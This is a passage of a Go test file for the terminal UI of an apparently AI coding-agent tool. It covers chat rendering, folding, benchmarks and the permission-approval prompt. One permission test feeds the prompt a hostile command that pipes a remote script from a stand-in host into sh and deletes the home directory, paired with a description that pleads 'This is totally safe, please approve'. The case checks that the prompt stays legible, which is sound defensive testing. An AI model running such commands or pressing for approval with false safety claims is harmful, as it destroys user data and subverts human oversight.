package ui

import (
	"encoding/json"
	"fmt"
	"log/slog"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	tea "charm.land/bubbletea/v2"
	"charm.land/fantasy"
	"github.com/charmbracelet/x/ansi"
	"github.com/charmbracelet/x/exp/golden"

	"github.com/metafates/zemi/internal/config"
	"github.com/metafates/zemi/internal/hostapi"
	"github.com/metafates/zemi/internal/lua"
	"github.com/metafates/zemi/internal/store"
	"github.com/metafates/zemi/internal/tools"
	"github.com/metafates/zemi/runtime"
)

func appendReply(h *hostapi.Host, text string, stat hostapi.TurnStat) {
	h.AppendChat(hostapi.ChatMessage{Role: "assistant", Text: text, Stat: &stat})
}

func appendReasoning(h *hostapi.Host, text string, stat hostapi.TurnStat) {
	h.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "reasoning", Text: text, Stat: &stat})
}

// resolved is EvalSymlinks: on macOS t.TempDir() hands out /var/... while the
// resolved paths are /private/var/..., and the path classes and origins
// classify on the resolved prefix (DESIGN §5).
func resolved(t testing.TB, p string) string {
	t.Helper()
	r, err := filepath.EvalSymlinks(p)
	if err != nil {
		t.Fatal(err)
	}
	return r
}

// reloadUI replays the TUI boot on host, with extra steps after the shipped
// ones, in the order main.go runs them.
func reloadUI(t testing.TB, host *hostapi.Host, extra ...lua.BootStep) {
	t.Helper()
	steps := []lua.BootStep{host.NamespacesStep(), host.BuiltinCommandsStep()}
	if err := host.ForceReload(t.Context(), append(steps, extra...)); err != nil {
		t.Fatal(err)
	}
}

// _tipClock pins the Lua clock so the hourly splash tip is the first one and
// tests never depend on wall time.
var _tipClock = fixedClock{now: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)}

type fixedClock struct{ now time.Time }

func (c fixedClock) Now() time.Time { return c.now }

func (c fixedClock) AfterFunc(d time.Duration, f func()) func() bool {
	return time.AfterFunc(d, f).Stop
}

// bootAgentApp boots a full host + app with the default UI, mirroring the
// golden_test harness.
func bootAgentApp(t testing.TB, w, h int) (*App, *hostapi.Host) {
	t.Helper()
	_, cfg := tempHome(t)
	return bootAgentAppOn(t, w, h, _tipClock, cfg)
}

// bootAgentAppPinned is bootAgentApp with $HOME pointed at the boot's own
// home, so rendered paths read ~; the Setenv rules out t.Parallel.
func bootAgentAppPinned(t testing.TB, w, h int) (*App, *hostapi.Host) {
	t.Helper()
	home, cfg := tempHome(t)
	t.Setenv("HOME", home)
	return bootAgentAppOn(t, w, h, _tipClock, cfg)
}

// bootAgentAppOn is bootAgentApp on clock, nil for the wall clock, with cfg
// as the config home. A test that pins rendered ~ paths points $HOME at
// cfg's home first, which rules out t.Parallel for it.
func bootAgentAppOn(t testing.TB, w, h int, clock lua.Clock, cfg string) (*App, *hostapi.Host) {
	t.Helper()
	return bootAgentAppIn(t, w, h, clock, cfg, "")
}

// bootAgentAppIn is bootAgentAppOn in a project: a host that knows its
// project has a scratchpad, and a run keeps its script and journal there.
func bootAgentAppIn(t testing.TB, w, h int, clock lua.Clock, cfg, project string) (*App, *hostapi.Host) {
	t.Helper()
	ctx := t.Context()
	data, state := t.TempDir(), t.TempDir()
	data, state = resolved(t, data), resolved(t, state)

	log := slog.New(slog.DiscardHandler)
	settings := config.NewStore()
	classes := lua.PathClasses{
		{Prefix: cfg, Origin: lua.OriginUser},
		{Prefix: filepath.Join(data, "plugins"), Origin: lua.OriginPlugin},
	}
	rt := lua.NewRuntime(lua.RuntimeOptions{Log: log, PathClass: classes, RuntimeFS: runtime.FS, Clock: clock})
	host := hostapi.NewHost(rt, log, settings, config.Dirs{ConfigHome: cfg, DataHome: data, StateHome: state, ProjectDir: project})
	t.Cleanup(host.Close)
	app := NewApp(host, log)
	host.SetUIHooks(app)
	app.CaptureHooks()

	steps := []lua.BootStep{host.NamespacesStep()}
	if err := rt.Boot(ctx, steps); err != nil {
		t.Fatalf("boot: %v", err)
	}
	app.Update(tea.WindowSizeMsg{Width: w, Height: h})
	app.timeStr = "12:34"
	app.now = func() time.Time { return time.UnixMilli(500) }
	// a test's clock is pinned, so a pill fade would freeze mid-ramp: the
	// boot's frames are settled ones, statusline pills start settled shown
	app.settleRamps()
	// the rail's rise reads its own clock; none is pinned here
	app.chatFolds().now = nil
	return app, host
}

// clickChat is a click on a chat row with that id, delivered as the mouse
// delivers one: the chat's own handler takes it, or the command path does.
func clickChat(t testing.TB, app *App, id string) {
	t.Helper()
	w := app.widgetByID("chat")
	if w == nil || w.onClick == nil || !w.onClick(app, map[string]any{"id": id}) {
		t.Fatalf("the chat did not take the click %q", id)
	}
	app.bump() // the rows the fold redraws join the next frame
}

// addWidget registers a Go widget on the app, as shippedWidgets does at boot.
func addWidget(app *App, w *widget) {
	app.widgets = append(app.widgets, w)
}

// renderChat draws the shipped chat at w by h over state, as the frame
// goroutine does, and says whether it asked to run again.
func renderChat(t testing.TB, app *App, w, h int, st hostapi.UIState) ([][]hostapi.Segment, bool) {
	t.Helper()
	wg := app.widgetByID("chat")
	if wg == nil {
		t.Fatal("the shipped chat is not registered")
	}
	lines, more, err := app.renderWidget(shownWidget{ID: "chat", Region: _regionChat, Wrap: wg.wrap, Go: wg, width: w, height: h}, app.host.ScreenState(w, h, st))
	if err != nil {
		t.Fatal(err)
	}
	return lines, more
}

// chatRows is the chat widget's rows at w, trailing blanks trimmed, as a
// test's assertion reads them.
func chatRows(t testing.TB, app *App, w int) []string {
	t.Helper()
	lines, _ := renderChat(t, app, w, 20, app.uiState())
	out := make([]string, 0, len(lines))
	for _, l := range lines {
		out = append(out, strings.TrimRight(hostapi.SegsText(l), " "))
	}
	return out
}

// testStore gives the host a session store of its own: the harness boots with
// no project dir, so no project store came with it.
func testStore(t testing.TB, host *hostapi.Host) *store.DB {
	t.Helper()
	db, err := store.Open(filepath.Join(t.TempDir(), "p.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { db.Close() })
	host.DB = db
	return db
}

// seedLongChat fills the session with turns of reasoning, tool rows, a diff
// and a markdown reply.
func seedLongChat(host *hostapi.Host, turns int) {
	const reply = "## Heading\n\nA paragraph of the reply with `inline code` and **bold** that wraps across the chat width and then some more words.\n\n```go\nfunc example(a, b int) int {\n\tif a > b {\n\t\treturn a - b\n\t}\n\treturn b - a\n}\n```\n\n- item one\n- item two\n"
	const diff = "--- a/x.go\n+++ b/x.go\n@@ -1,6 +1,7 @@\n package x\n \n-func a() {}\n+func a() int { return 1 }\n+func b() {}\n \n // tail\n"
	for i := range turns {
		host.AppendMessage("user", fmt.Sprintf("question %d about the build", i))
		appendReasoning(host, "thinking about it for a while", hostapi.TurnStat{})
		host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "internal/ui/app.go", Status: "ok"})
		host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "edit", Text: "internal/ui/x.go", Status: "ok", Diff: diff})
		appendReply(host, reply, hostapi.TurnStat{Out: 200})
	}
}

// _frameTurns: a long transcript costs a frame only a slice of its line
// headers, never converting or wrapping its lines again.
var _frameTurns = []int{10, 500}

// BenchmarkStreamingFrame is one frame while a reply streams: the widget
// re-renders and only the streamed rows are converted and wrapped again.
func BenchmarkStreamingFrame(b *testing.B) {
	for _, turns := range _frameTurns {
		b.Run(strconv.Itoa(turns), func(b *testing.B) {
			app, host := bootAgentApp(b, 140, 40)
			seedLongChat(host, turns)
			app.renderSync(b)
			for i := 0; b.Loop(); i++ {
				host.SeedStream(hostapi.StreamSnapshot{Active: true, Text: fmt.Sprintf("streaming token %d", i)})
				app.frameGen++
				app.renderSync(b)
				_ = app.Frame()
			}
		})
	}
}

// seedResumedChat is a long session whose units take the chat's budget to
// render.
func seedResumedChat(host *hostapi.Host, turns int) {
	for i := range turns {
		host.AppendMessage("user", fmt.Sprintf("question %d", i))
		appendReply(host, strings.Repeat(fmt.Sprintf("A paragraph of reply %d with `code` and **bold** that wraps across the chat width.\n\n", i), 28), hostapi.TurnStat{})
	}
}

// BenchmarkColdChatRender is the first chat render of a long resumed
// session, which the chat's budget bounds.
func BenchmarkColdChatRender(b *testing.B) {
	app, host := bootAgentApp(b, 140, 40)
	seedResumedChat(host, 500)
	for b.Loop() {
		renderChat(b, app, 138, 30, app.uiState())
	}
}

// lagClock is a machine so slow or loaded that every read of the clock is
// a second after the last: each render budget is spent before it starts.
type lagClock struct{ s atomic.Int64 }

func (c *lagClock) Now() time.Time { return time.Unix(c.s.Add(1), 0) }

func (c *lagClock) AfterFunc(d time.Duration, f func()) func() bool {
	return time.AfterFunc(d, f).Stop
}

// TestColdChatRender: however slow the machine, the first chat render of a
// long resumed session fills the view and tops it with the prompt the view
// pins, however many rows answer that prompt, and leaves the rest to the
// renders it asks for; a reader scrolled up keeps their place while a render
// fills in again.
func TestColdChatRender(t *testing.T) {
	const turns = 50 // an exchange is ~58 lines
	longTurn := func(host *hostapi.Host) {
		host.AppendMessage("user", "question 0")
		for i := range 100 {
			appendReasoning(host, "thinking", hostapi.TurnStat{})
			host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "read", Text: "x.go", Status: "ok"})
			appendReply(host, fmt.Sprintf("reply %d", i), hostapi.TurnStat{})
		}
	}
	for _, c := range []struct {
		name   string
		seed   func(*hostapi.Host)
		height int
		has    [2]string
	}{
		{"view", func(h *hostapi.Host) { seedResumedChat(h, turns) }, 30, [2]string{"question 49", "reply 49"}},
		{"exchange shorter than the view", func(h *hostapi.Host) { seedResumedChat(h, turns) }, 100, [2]string{"question 48", "reply 49"}},
		{"one long turn", longTurn, 30, [2]string{"question 0", "reply 99"}},
	} {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			app, host := bootAgentAppOn(t, 140, 40, &lagClock{}, "")
			c.seed(host)
			var lines [][]hostapi.Segment
			has := func(s string) bool {
				return slices.ContainsFunc(lines, func(l []hostapi.Segment) bool { return strings.Contains(hostapi.SegsText(l)+" ", s+" ") })
			}
			lines, more := renderChat(t, app, 138, c.height, app.uiState())
			if len(lines) == 0 || !more {
				t.Fatalf("render: %d lines, more %v", len(lines), more)
			}
			if !has(c.has[0]) || !has(c.has[1]) {
				t.Fatalf("the render has %q %v, %q %v", c.has[0], has(c.has[0]), c.has[1], has(c.has[1]))
			}
			// the transcript's own first row is the pad above the first message
			if len(lines) < 2 || strings.TrimSpace(hostapi.SegsText(lines[0])) != "" || !strings.Contains(hostapi.SegsText(lines[1]), "question 0") || !has("reply 0") {
				t.Fatalf("the fill ends without the first exchange: %d lines from %q", len(lines), hostapi.SegsText(lines[0]))
			}
			for more {
				if lines, more = renderChat(t, app, 138, c.height, app.uiState()); len(lines) == 0 {
					t.Fatal("the fill dried up")
				}
			}
			if !has(c.has[0]) || !has("reply 0") {
				t.Fatalf("the whole fill lost %q or %q", c.has[0], "reply 0")
			}
		})
	}

	app, host := bootAgentAppOn(t, 140, 40, &lagClock{}, "")
	seedResumedChat(host, turns)
	app.renderSync(t)
	app.Frame()
	for range 60 {
		app.applyScroll(hostapi.ScrollUp, _regionNone)
	}
	app.Frame()
	st := app.scrolls[app.scrollDef]
	top, anchor := st.top, slices.Clone(st.anchor)
	// an appended row rebuilds every unit from a changed transcript: the
	// rebuild must not move the view
	host.AppendMessage("user", "one more")
	app.frameGen++
	for more := true; more; app.Frame() {
		var lines [][]hostapi.Segment
		lines, more = renderChat(t, app, st.rect.Dx(), st.rect.Dy(), app.uiState())
		app.onWidgetRendered(widgetRender{id: "chat", lines: lines, more: more, width: st.rect.Dx(), height: st.rect.Dy(), gen: app.frameGen})
	}
	if st.top != top || !slices.Equal(st.anchor, anchor) {
		t.Fatalf("view moved from row %d %q to row %d %q", top, anchor, st.top, st.anchor)
	}
}

// addRunMessage stores one model message in a run's child session, which
// loadRun reads back into transcript rows.
func addRunMessage(t *testing.T, db *store.DB, session string, m fantasy.Message) {
	t.Helper()
	b, err := json.Marshal(m)
	if err != nil {
		t.Fatal(err)
	}
	if err := db.AddMessage(&store.Message{SessionID: session, Role: string(m.Role), PartsJSON: string(b)}); err != nil {
		t.Fatal(err)
	}
}

// TestNoticeBurst: a burst of notice rows draws as one block, no blank row
// between them, its oldest behind one row a click opens.
func TestNoticeBurst(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 100, 30)
	host.AppendMessage("user", "go")
	for i := range 6 {
		host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "notice", Text: fmt.Sprintf("Background agent a%d (explore) finished", i)})
	}
	rows := func() []string { return chatRows(t, app, 98) }
	rows() // the first render forgets what was opened before it
	got := rows()
	newest, older := slices.Index(got, "◦ Background agent a5 (explore) finished"), slices.Index(got, "◦ Background agent a4 (explore) finished")
	if newest < 0 || older < 0 || newest-older != 1 || !slices.Contains(got, "  … 3 earlier") {
		t.Fatalf("the burst is not one block of the newest three:\n%s", strings.Join(got, "\n"))
	}
	if slices.Contains(got, "◦ Background agent a0 (explore) finished") {
		t.Fatalf("the fold holds a row back:\n%s", strings.Join(got, "\n"))
	}
	clickChat(t, app, "more:2")
	if got = rows(); !slices.Contains(got, "◦ Background agent a0 (explore) finished") || !slices.Contains(got, "  … collapse") {
		t.Fatalf("the fold does not open:\n%s", strings.Join(got, "\n"))
	}
}

// TestBgTurnFolds: a turn whose calls all went to the background folds into
// its digest too, or its rail would hang open over the events that follow it.
func TestBgTurnFolds(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 140, 30)
	host.AppendMessage("user", "review it")
	host.AppendChat(hostapi.ChatMessage{Role: "assistant", Kind: "tool", Tool: "agent", Label: "Review rail-fold branch", Status: "bg", Run: "rr1"})
	appendReply(host, "the review is running", hostapi.TurnStat{})
	rows := chatRows(t, app, 138)
	// the fold row is the digest alone: the count, then the run's about
	fold := slices.IndexFunc(rows, func(r string) bool { return strings.HasPrefix(r, "▸ 1 agent run") })
	if fold < 0 || !strings.Contains(rows[fold], "Review rail-fold branch") {
		t.Fatalf("the background turn does not fold:\n%s", strings.Join(rows, "\n"))
	}
}

// TestLoneThoughtDigestOpensItsText: a run of one thought opens from its
// digest as the text alone, the digest already naming the thought.
func TestLoneThoughtDigestOpensItsText(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 140, 30)
	host.AppendMessage("user", "plan it")
	appendReasoning(host, "hmm, the user asked to plan\nthen build", hostapi.TurnStat{ThoughtMS: 4400})
	rows := func() []string { return chatRows(t, app, 138) }
	click := func(id string) []string {
		clickChat(t, app, id)
		return rows()
	}
	const digest = "▸ thought 4.4s"
	const openDigest = "▾ thought 4.4s"
	closed := rows()
	if !slices.Contains(closed, digest) || slices.ContainsFunc(closed, func(r string) bool { return strings.HasPrefix(r, "│ ") }) {
		t.Fatalf("the lone thought does not fold into its digest:\n%s", strings.Join(closed, "\n"))
	}
	open := click("turn:2")
	rail := []string{"│", "│   hmm, the user asked to plan", "│   then build", "│"}
	at := slices.Index(open, openDigest)
	if at < 0 || !slices.Equal(open[at+1:at+1+len(rail)], rail) {
		t.Fatalf("the opened lone thought:\n%s", strings.Join(open, "\n"))
	}
	if folded := click("turn:2"); !slices.Equal(folded, closed) {
		t.Fatalf("a second click does not fold the run:\n%s", strings.Join(folded, "\n"))
	}
}

// TestShortThoughtFolds: a thought under the readout's 50ms still folds into
// its digest — a run whose digest is empty draws its rail, a block no fold
// row closes.
func TestShortThoughtFolds(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 140, 30)
	host.AppendMessage("user", "hold on")
	appendReasoning(host, "both personas are still running", hostapi.TurnStat{})
	appendReply(host, "holding for the two personas", hostapi.TurnStat{})
	rows := chatRows(t, app, 138)
	if !slices.Contains(rows, "▸ thought") || slices.ContainsFunc(rows, func(r string) bool { return strings.HasPrefix(r, "│ ") }) {
		t.Fatalf("the short thought does not fold into its digest:\n%s", strings.Join(rows, "\n"))
	}
}

// BenchmarkIdleFrame is a frame with nothing changed since the last one.
func BenchmarkIdleFrame(b *testing.B) {
	for _, turns := range _frameTurns {
		b.Run(strconv.Itoa(turns), func(b *testing.B) {
			app, host := bootAgentApp(b, 140, 40)
			seedLongChat(host, turns)
			app.renderSync(b)
			for b.Loop() {
				_ = app.Frame()
			}
		})
	}
}

// waitPrompt pumps queued hook messages onto the owning goroutine until
// cond turns true (blocking hooks answer from other goroutines; capture
// mode keeps every state mutation here).
func waitPrompt(t *testing.T, app *App, cond func() bool) {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		for app.Pump() {
		}
		if cond() {
			return
		}
		time.Sleep(time.Millisecond)
	}
	t.Fatal("prompt did not open within 2s")
}

// TestGoldenPermission pins the Go-owned permission ask (DESIGN §6.2, §8):
// Go chrome, the title, the facts table, the badge, and the answers
// delivered to the asker.
func TestGoldenPermission(t *testing.T) {
	script := "set -e; for pkg in $(go list ./internal/...); do go test -count=1 -run TestGolden \"$pkg\" 2>&1 | tee -a \"$TMPDIR/golden.log\"; done; grep -c FAIL \"$TMPDIR/golden.log\" || true; rm -rf ~/.cache/zemi-golden && git stash list | head -5"
	diff := "--- a/internal/ui/agent.go\n+++ b/internal/ui/agent.go\n@@ -41,5 +41,5 @@\n func (a *App) permBox(pa *permAskPrompt, w, h int) [][]hostapi.Segment {\n \treq := pa.req\n-\tisDiff := strings.HasPrefix(req.Preview, \"--- \")\n+\tisDiff := req.Subject == perm.SubjectWrite && req.Preview != \"\"\n \tmaxW := 96\n"
	for _, c := range []struct {
		name string
		w, h int
		req  hostapi.PermRequest
	}{
		{"shell-80x40", 80, 40, hostapi.PermRequest{
			Tool: "shell", Subject: "tool.shell", Arg: script,
			Reason:      "this runs the whole suite and takes a few minutes",
			Description: "Run the golden tests one package at a time, then clear the cache",
		}},
		{"edit-diff-120x30", 120, 30, hostapi.PermRequest{
			Tool: "edit", Subject: "fs.write", Arg: "internal/ui/agent.go", Preview: diff,
			Reason: "this changes a file outside cmd/, the directory zemi was started in",
		}},
		{"subagent-80x24", 80, 24, hostapi.PermRequest{
			Tool: "shell", Subject: "tool.shell", Arg: "npm ci && npm run build",
			Agent: "general agent", Reason: "the model asked for the network",
			Description: "Install dependencies and build the site",
		}},
		{"plugin-tool-80x30", 80, 30, hostapi.PermRequest{
			Tool: "jira_create", Subject: "tool.jira_create", Arg: "jira_create",
			Preview: `{"project":"ZEM","type":"Task","summary":"Permission prompt lists the programs a command runs","labels":["ui","permissions"]}`,
			Reason:  "zemi cannot tell what this tool does",
		}},
	} {
		t.Run(c.name, func(t *testing.T) {
			app, _ := bootAgentAppPinned(t, c.w, c.h)
			done := make(chan struct{})
			var allowed bool
			var by string
			go func() {
				allowed, by = app.AskPermission(c.req)
				close(done)
			}()
			waitPrompt(t, app, func() bool { return app.permAsk != nil })
			app.renderSync(t)
			golden.RequireEqual(t, app.Frame())
			app.Update(tea.KeyPressMsg{Code: 'y', Text: "y"})
			<-done
			if !allowed || by != "user:once" {
				t.Fatalf("allowed=%v by=%q", allowed, by)
			}
		})
	}
}

// Which ask surfaces first is not fixed, so exactly one is denied.
func TestPermissionDenyOneAtATime(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 70, 16)
	// the ask-everything policy a plugin's tool.pre handler makes
	pipe := host.PipelineFor()
	pipe.ForceAsk()
	res := make(chan bool, 2)
	for _, req := range []tools.Request{{Subject: "fs.write", Arg: "/etc/hosts", Reason: "edit hosts"}, {Subject: "tool.shell", Arg: "make test"}} {
		go func() { res <- pipe.Check(req).Allowed }()
	}
	waitPrompt(t, app, func() bool { return app.permAsk != nil && host.AsksWaiting() == 2 })
	app.renderSync(t)
	first := app.permAsk
	app.Update(tea.KeyPressMsg{Code: 'n', Text: "n"})
	waitPrompt(t, app, func() bool { return app.permAsk != first && app.permAsk != nil })
	if app.permAsk.size != first.size {
		t.Fatalf("the next prompt must open in the answered box: %+v, was %+v", app.permAsk.size, first.size)
	}
	// the answer swallowed the keys behind it (a paste's tail); a human's
	// next key comes after the swallow window
	app.askSwallow = time.Time{}
	app.Update(tea.KeyPressMsg{Code: 'y', Text: "y"})
	if a, b := <-res, <-res; a == b {
		t.Fatalf("exactly one ask must be denied: %v %v", a, b)
	}
	waitPrompt(t, app, func() bool { return app.permAsk == nil })
	app.permAsk = &permAskPrompt{} // answered, and the Refresh that drops it lost
	app.askSwallow = time.Time{}
	if app.Update(tea.KeyPressMsg{Code: 'x', Text: "x"}); app.permAsk != nil || app.composer.text != "x" {
		t.Fatalf("an inert box with no ask waiting must give the keys back: %q", app.composer.text)
	}
}

// TestPermissionTellNarrow: at 30 columns the box keeps its right border
// and every choice keeps its key button, down moves between them, and "t"
// denies the open ask and the waiting one.
func TestPermissionTellNarrow(t *testing.T) {
	t.Parallel()
	app, host := bootAgentApp(t, 30, 30)
	// the ask-everything policy a plugin's tool.pre handler makes
	pipe := host.PipelineFor()
	pipe.ForceAsk()
	res := make(chan bool, 2)
	for _, arg := range []string{"make test", "make lint"} {
		go func() { res <- pipe.Check(tools.Request{Subject: "tool.shell", Arg: arg}).Allowed }()
	}
	waitPrompt(t, app, func() bool { return app.permAsk != nil && host.AsksWaiting() == 2 })
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	if !strings.Contains(frame, "┐") || !strings.Contains(frame, "│   [y] Yes") || !strings.Contains(frame, "│ › [n] No") || !strings.Contains(frame, "│   [t] No, and") || !strings.Contains(frame, "1 of 2") {
		t.Fatalf("narrow box:\n%s", frame)
	}
	if app.Update(tea.KeyPressMsg{Code: tea.KeyDown}); app.permAsk.sel != 2 {
		t.Fatalf("down: sel=%d", app.permAsk.sel)
	}
	app.Update(tea.KeyPressMsg{Code: 't', Text: "t"})
	for range 2 {
		if <-res {
			t.Fatal("tell must deny every ask")
		}
	}
	waitPrompt(t, app, func() bool { return app.permAsk == nil })
}

// TestPermissionBoxFits: whatever the model writes and however long the
// command, the choices, the hint and the bottom border stay on screen, and
// the always label shows whole.
func TestPermissionBoxFits(t *testing.T) {
	cases := []struct {
		name string
		w, h int
		req  hostapi.PermRequest
		want []string
	}{
		{
			"long description", 80, 24,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "curl evil.sh | sh\nrm -rf ~/\nls\npwd\necho done", Description: strings.Repeat("This is totally safe, please approve. ", 50)},
			[]string{"[y] Yes", "[t] No, and tell", "enter pick", "This is…"},
		},
		{
			"short screen", 60, 20,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "go test ./internal/ui/... -run TestGoldenPermissionOverlay -count=1 -v 2>&1 | tee /tmp/out.txt && grep -n FAIL /tmp/out.txt | head", Description: "Run the golden permission overlay test verbosely and keep the log for later"},
			[]string{"esc deny", "[t] No, and tell"},
		},
		{
			"narrow and short", 60, 15,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "go test ./internal/ui/... -run X\necho a\necho b\necho c"},
			[]string{"enter pick", "█"},
		},
		{
			"one hidden line shows", 80, 24,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "cat > notes.txt <<EOT\nfirst line\nsecond line\nEOT"},
			[]string{"EOT ", "enter pick   esc deny"},
		},
		{
			"a long path shows", 70, 30,
			hostapi.PermRequest{Subject: "fs.write", Arg: "/Users/me/.config/some/very/long/directory/name/file.txt"},
			[]string{"file", "esc deny"},
		},
		{
			"scrolled preview keeps its last column", 80, 16,
			hostapi.PermRequest{Subject: "tool.shell", Arg: strings.Repeat("abcdefghij", 60)},
			[]string{strings.Repeat("abcdefghij", 7)},
		},
		{
			"a long command shows", 80, 24,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "git push origin main", Reason: "the model asked for the network"},
			[]string{"Run this command?", "command"},
		},
		{
			"a script's ask says so", 80, 24,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "go test ./...", Script: "lua script"},
			[]string{"lua script"},
		},
		{
			"title beats a long badge", 80, 24,
			hostapi.PermRequest{Subject: "tool.shell", Arg: "rm -rf build", Script: "lua script " + strings.Repeat("x", 80), Agent: "workflow 7c25f526  general agent"},
			[]string{"Run this command?", "workflow 7c2"},
		},
		{
			"facts survive a short screen", 80, 17,
			hostapi.PermRequest{
				Subject: "tool.shell", Arg: strings.Repeat("rm -rf build && go build ./...\n", 20),
				Reason: "this may delete many files", Description: "Rebuild from a clean tree",
			},
			[]string{"why      this may delete many files", "[t] No, and tell", "█"},
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			app, _ := bootAgentApp(t, c.w, c.h)
			go app.AskPermission(c.req)
			waitPrompt(t, app, func() bool { return app.permAsk != nil })
			app.renderSync(t)
			frame := ansi.Strip(app.Frame())
			for _, want := range append(c.want, "└─") {
				if !strings.Contains(frame, want) {
					t.Fatalf("missing %q:\n%s", want, frame)
				}
			}
			app.answerPerm(false, tools.ByNobody) // the box the render left open
		})
	}
}

// TestGoldenModelPicker pins the model picker: zemi.model.pick returns at
// once, so the interpreter stays free while it is open, and enter runs /model <id>.
func TestGoldenModelPicker(t *testing.T) {
	app, host := bootAgentApp(t, 70, 20)
	app.SignalBoot(nil) // the statusline's model pill waits out the boot
	runLua(t, app, `
		zemi.provider.add({ id = "anthropic", kind = "openai_compat", base_url = "http://x", api_key = "k", models = {
			{ id = "claude-sonnet-4-5", display = "Claude Sonnet 4.5" }, { id = "claude-haiku-4-5", display = "Claude Haiku 4.5" } } })
		zemi.provider.add({ id = "openai", kind = "openai_compat", base_url = "http://x", models = { { id = "gpt-5", display = "GPT-5" } } })
		zemi.model.set("anthropic/claude-sonnet-4-5")`)
	done := make(chan error, 1)
	go func() {
		done <- host.RT.ExecuteChunk(t.Context(), `zemi.model.pick()`, "test.lua", lua.OriginUser)
	}()
	select {
	case err := <-done:
		if err != nil {
			t.Fatal(err)
		}
	// a hold on the interpreter is a hang, not a slow return, so a loaded
	// machine must never fail this wait
	case <-time.After(10 * time.Second):
		t.Fatal("zemi.model.pick holds the interpreter while the picker is open")
	}
	for app.Pump() {
	}

	app.Update(tea.KeyPressMsg{Code: tea.KeyDown}) // -> haiku
	app.Update(tea.KeyPressMsg{Code: tea.KeyDown}) // -> gpt-5
	app.renderSync(t)
	golden.RequireEqual(t, app.Frame())

	var ran string // main.go owns /model
	host.Commands.Add(&hostapi.Command{
		Name: "model", NArgs: "?", Origin: lua.OriginBuiltin, Gen: hostapi.Gen(1),
		GoFn: func(_ *hostapi.Host, args string, confirm bool) error { ran = args; return nil },
	})
	app.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if ran != "openai/gpt-5" {
		t.Fatalf("enter ran /model %q", ran)
	}
}

// TestInterruptKeys: esc interrupts a running turn on a second press within
// 2s, an agent view takes it as back, a busy job's chord cancels the job;
// ctrl+c clears a draft into the history first, mid-turn included, and arms
// quit on an empty composer, never interrupting. A held key prefix
// replays as plain keys when the next key breaks it or it times out, and
// ctrl+c drops it.
func TestInterruptKeys(t *testing.T) {
	esc, ctrlC, up := tea.KeyPressMsg{Code: tea.KeyEscape}, tea.KeyPressMsg{Code: 'c', Mod: tea.ModCtrl}, tea.KeyPressMsg{Code: tea.KeyUp}
	ctrlE, x := tea.KeyPressMsg{Code: 'e', Mod: tea.ModCtrl}, tea.KeyPressMsg{Code: 'x', Text: "x"}
	altEsc := tea.KeyPressMsg{Code: tea.KeyEscape, Mod: tea.ModAlt} // a fast double-press the terminal coalesced
	var wait tea.KeyPressMsg                                        // advances the clock 3s
	view := tea.KeyPressMsg{Code: -1}                               // opens an agent view
	stop := tea.KeyPressMsg{Code: -2}                               // ends the turn
	box := tea.KeyPressMsg{Code: -3}                                // opens a test overlay
	for _, c := range []struct {
		name                      string
		active, view, busy, quest bool
		draft                     string
		keys                      []tea.KeyPressMsg
		cancel, armed             bool
		composer, row             string
	}{
		{"esc arms", true, false, false, false, "", []tea.KeyPressMsg{esc}, false, false, "", "esc again"},
		{"esc esc interrupts", true, false, false, false, "", []tea.KeyPressMsg{esc, esc}, true, false, "also this", "ctrl+c quit"},
		{"alt+esc is the coalesced pair, it interrupts", true, false, false, false, "", []tea.KeyPressMsg{altEsc}, true, false, "also this", "ctrl+c quit"},
		{"esc arms again after 3s", true, false, false, false, "", []tea.KeyPressMsg{esc, wait, esc}, false, false, "", "esc again"},
		{"esc in an agent view goes back and disarms", true, true, false, false, "", []tea.KeyPressMsg{esc, view, esc, esc}, false, false, "", "esc again"},
		{"idle esc esc does nothing, the draft kept", false, false, false, false, "a draft", []tea.KeyPressMsg{esc, esc}, false, false, "a draft", ""},
		{"idle esc arms again after 3s", false, false, false, false, "", []tea.KeyPressMsg{esc, wait, esc}, false, false, "", ""},
		{"esc armed to interrupt disarms after the turn ends", true, false, false, false, "", []tea.KeyPressMsg{esc, stop, esc}, false, false, "", ""},
		{"esc esc with a busy job cancels it", false, false, true, false, "", []tea.KeyPressMsg{esc, esc}, false, false, "", ""},
		{"esc in an overlay closes it", false, false, false, false, "", []tea.KeyPressMsg{box, esc, esc}, false, false, "", ""},
		{"ctrl+c mid-turn arms quit, the turn kept", true, false, false, false, "", []tea.KeyPressMsg{ctrlC}, false, true, "", "ctrl+c again to quit"},
		{"ctrl+c clears a draft, up recalls no thrown-away draft", false, false, false, false, "draft", []tea.KeyPressMsg{ctrlC, up}, false, false, "", ""},
		{"ctrl+c clears a draft even mid-turn", true, false, false, false, "a draft", []tea.KeyPressMsg{ctrlC}, false, false, "", ""},
		{"ctrl+c on an empty composer arms quit", false, false, false, false, "", []tea.KeyPressMsg{ctrlC}, false, true, "", "ctrl+c again to quit"},
		{"a broken prefix replays", false, false, false, false, "abc", []tea.KeyPressMsg{ctrlE, x}, false, false, "abcx", ""},
		{"a timed out prefix replays", false, false, false, false, "abc", []tea.KeyPressMsg{ctrlE, wait, x}, false, false, "abcx", ""},
